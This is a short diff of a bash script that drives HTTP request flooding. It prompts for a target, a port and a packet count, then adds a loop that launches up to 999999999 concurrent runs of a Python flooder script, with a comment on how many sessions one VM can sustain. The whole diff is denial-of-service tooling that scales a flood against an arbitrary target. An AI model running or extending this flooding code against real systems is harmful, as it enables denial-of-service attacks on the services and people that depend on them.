@@ -18,7 +18,18 @@ read -p "Enter target Port no. [80/8081/8082]: " port
 read -p "Enter packets to send [999999999]: " pack
 #pack=999999999;
 
-python $script $target -a $port -p $pack;
+# Trial & Error tested
+# maximum of 100 sessions can be handled by a 16 CPU + 16GB RAM VM
+#sessions=100;
+read -p "Enter flood sessions [1-999999999]: " sessions;
+
+# Asynchronous / Concurrent HTTP requests flooding
+# 5 Flooding synchronously
+# Flood 1
+for ((i=0; i<$sessions; i++));
+do
+    python3 $script $target -a $port -p $pack;
+done
 
 # Asynchronous / Concurrent HTTP requests flooding
 # Flood 1
